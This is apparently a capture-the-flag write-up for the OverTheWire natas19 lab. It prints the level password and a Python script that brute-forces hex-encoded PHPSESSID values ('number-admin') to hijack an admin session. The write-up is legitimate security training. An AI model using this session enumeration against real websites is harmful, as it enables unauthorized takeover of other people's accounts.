## Username
natas19

## Password
tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr

## Write-Up
<img width="602" height="281" alt="image" src="https://github.com/user-attachments/assets/64d149e4-2248-4b77-967e-97db822984f7" />
In this situation, we should find out how sessionID is made  
The result of many test, i figure out that there is a pattern.  
The value of PHPSESSID is only using 0~9, and a little bit lower case alphabet.  
So encoding type is not URL, Base64 but Hex.  
So i tested, decoding value of PHPSESSID, it means hex -> 537-test.  
I figure out that pattern is the combination of the number used in previous level, plus '-', and username we input.  
For solving this problem, we should know that specific number for admin, and encoding 'number'-admin.  

```python
import requests

url='http://natas19.natas.labs.overthewire.org/index.php'
username='natas19'
password='tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'
auth=(username,password)

session=requests.Session()
session.auth=auth

def natas19_hexencoding(x):
    tmp=x.encode('UTF-8')
    return tmp.hex()

print("Start")
for num in range(1,641):
    print(f"Current num: {num}")
    cookies={'PHPSESSID':natas19_hexencoding(f"{num}-admin")}
    res=session.get(url,cookies=cookies)

    if 'You are an admin' in res.text:
        print(f"{num} is answer")

print("End")
```
I added a hex encoding function, So i got a answer number, 281, finally i got a password for natas20.  

## Method of solve
Session Hijacking  
Finding Encoding Pattern
